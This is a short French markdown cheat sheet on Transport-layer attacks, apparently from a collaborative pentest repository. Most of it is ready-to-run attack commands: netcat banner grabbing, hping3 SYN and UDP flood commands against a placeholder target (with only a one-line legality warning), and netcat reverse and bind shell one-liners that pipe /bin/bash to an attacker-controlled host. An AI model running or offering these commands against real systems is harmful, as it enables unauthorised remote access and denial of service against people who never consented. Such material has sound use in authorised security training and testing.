# Couche 4 – Transport

## 1. Types d’attaques sur la couche Transport

- **Port knocking & Banner Grabbing**  
  Repérer la présence et le type de service sur un port en lisant la “bannière” de bienvenue.

- **Attaque par déni de service (DoS, SYN Flood, UDP Flood)**  
  Saturer un port ou un service pour provoquer son indisponibilité.

- **Établissement de connexions non autorisées (reverse shell, bind shell)**  
  Ouvrir ou forcer une connexion à distance pour obtenir un accès non autorisé.

---

## 2. Outils et méthodes

### ⚡ Attaque : Banner Grabbing

#### Outil : **Netcat (nc)**
- **Description** : Outil universel pour lire ou écrire sur un port TCP/UDP.
- **Pourquoi l’utiliser ?** :  
  - Facile à utiliser pour tester les réponses sur n’importe quel port
- **Installation** :  
  - `sudo apt install netcat`
- **Commandes** :  
  - `nc [IP cible] 80`  
    (tapez ensuite `HEAD / HTTP/1.0` puis Entrée pour obtenir une bannière HTTP)
  - `nc [IP cible] 21`  
    (bannière FTP)

---

### ⚡ Attaque : DoS/SYN Flood

#### Outil : **Hping3**
- **Description** : Générateur de paquets TCP/UDP pour stress-test.
- **Installation** :  
  - `sudo apt install hping3`
- **Commandes** :  
  - `sudo hping3 -S --flood -p 80 [IP cible]`
  - `sudo hping3 --udp --flood -p 53 [IP cible]`
- **Attention** : DoS est illégal sans autorisation.

---

### ⚡ Attaque : Reverse shell / Bind shell

#### Outil : **Netcat**
- **Pourquoi l’utiliser** :  
  - Facile à déployer pour obtenir un shell à distance
- **Commandes** :  
  - **Reverse shell** (de la victime vers l’attaquant) :  
    - Attaquant : `nc -lvp 4444`
    - Victime : `nc [IP de l’attaquant] 4444 -e /bin/bash`
  - **Bind shell** (de l’attaquant vers la victime) :  
    - Victime : `nc -lvp 4444 -e /bin/bash`
    - Attaquant : `nc [IP de la victime] 4444`

---

## 3. Contribution

> Ajoutez vos attaques ou outils en gardant le schéma : explication, contexte, installation, exemple(s) de commande(s).
